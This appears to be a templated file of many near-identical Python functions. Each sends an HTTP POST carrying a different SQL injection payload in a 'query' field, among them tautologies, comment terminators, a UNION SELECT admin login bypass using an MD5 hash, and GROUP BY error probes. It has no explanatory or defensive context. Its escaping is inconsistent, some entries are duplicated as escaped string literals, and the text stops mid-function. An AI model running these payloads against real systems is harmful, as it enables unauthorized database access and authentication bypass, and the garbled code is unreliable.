'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221234 \\x22 AND 1=0 UNION ALL SELECT \\x22admin\\x22, \\x2281dc9bdb52d04dc20036dbd8313ed055\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22==\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' #\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' –\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' and 1='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' and a='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or true\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22\\x22=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221′) and '1′='1–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 AND 1=0 UNION ALL SELECT \\x22\\x22, \\x2281dc9bdb52d04dc20036dbd8313ed055\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22and 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22and 1=1–\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' and 'one'='one\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' and 'one'='one–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' group by password having 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' group by userid having 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' group by username having 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22like '%'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 –\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or         0=0 #\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 #\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 –\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 0=0 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 0=0 –\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%' or '0'='0\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1–\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1'='1'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1'='1'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1′='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 –\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1;#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or '1'='1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or '1'='1'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or '1'='1'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('1'='1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('1'='1'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
